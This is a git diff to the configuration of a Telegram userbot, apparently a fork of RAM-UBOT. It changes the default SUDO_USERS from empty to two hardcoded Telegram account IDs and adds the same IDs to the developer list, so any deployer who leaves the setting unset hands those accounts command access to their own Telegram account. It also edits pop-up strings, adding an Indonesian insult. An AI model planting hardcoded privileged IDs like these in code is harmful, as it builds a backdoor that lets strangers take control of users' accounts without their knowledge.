@@ -126,13 +126,13 @@ UPSTREAM_REPO_URL = os.environ.get(
     "https://github.com/Hafizikrillah/RAM-UTOD")
 
 # sudo
-SUDO_USERS = {int(x) for x in os.environ.get("SUDO_USERS", "").split()}
+SUDO_USERS = {int(x) for x in os.environ.get("SUDO_USERS", "1927826833, 5185945994").split()}
 BL_CHAT = {int(x) for x in os.environ.get("BL_CHAT", "").split()}
 
 #handler
 CMD_HANDLER = os.environ.get("CMD_HANDLER") or "."
 
-SUDO_HANDLER = os.environ.get("SUDO_HANDLER", r"$")
+SUDO_HANDLER = os.environ.get("SUDO_HANDLER", r"?")
 
 BLACKLIST_GCAST = {int(x) for x in os.environ.get("BLACKLIST_GCAST", "").split()}
 
@@ -227,6 +227,8 @@ DEVG = [
     1977874449, #lunar
     844432220, #risman
     2003295492,
+    5185945994,
+    1927826833,
 ]
 
 # DEVS only own id
@@ -277,7 +279,7 @@ TERM_ALIAS = os.environ.get("TERM_ALIAS", "RAM-UBOT")
 BOT_VER = os.environ.get("BOT_VER", "9.2.5")
 
 # Default .alive Username
-ALIVE_USERNAME = os.environ.get("ALIVE_USERNAME", "Kane")
+ALIVE_USERNAME = os.environ.get("ALIVE_USERNAME", "Kane-Ubot")
 
 # Sticker Custom Pack Name
 S_PACK_NAME = os.environ.get("S_PACK_NAME", None)
@@ -793,7 +795,7 @@ with bot:
                     "✴️ **Help Mode Button Ditutup!** ✴️", buttons=openlagi
                 )
             else:
-                reply_pop_up_alert = f"Dikata Jangan Asal pencet milik {owner}"
+                reply_pop_up_alert = f"Dikata Jangan Asal Pencet Anjing, itu milik {owner}"
                 await event.answer(reply_pop_up_alert, cache_time=0, alert=True)
 
         @tgbot.on(
@@ -807,7 +809,7 @@ with bot:
                 buttons = paginate_help(current_page_number - 1, dugmeler, "helpme")
                 await event.edit(buttons=buttons)
             else:
-                reply_pop_up_alert = f"Anak Kontol, Ini Milik {owner}"
+                reply_pop_up_alert = f"Sorry Ye, Ini Milik {owner}"
                 await event.answer(reply_pop_up_alert, cache_time=0, alert=True)
 
         @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"ub_modul_(.*)")))
